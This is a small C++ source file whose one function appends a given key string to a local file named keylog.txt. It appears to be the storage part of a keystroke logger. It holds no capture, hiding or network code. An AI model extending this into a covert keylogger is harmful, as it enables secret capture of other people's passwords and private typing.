#include <fstream>
#include <iostream>
#include <string>
#include "storage.h"  // Include the header file for function declarations

const std::string logFilePath = "./keylog.txt";  // Path to log file

void saveKeystroke(const std::string& key) {
    std::ofstream logFile(logFilePath, std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Error opening log file!" << std::endl;
        return;
    }

    logFile << key;
    logFile.close();
}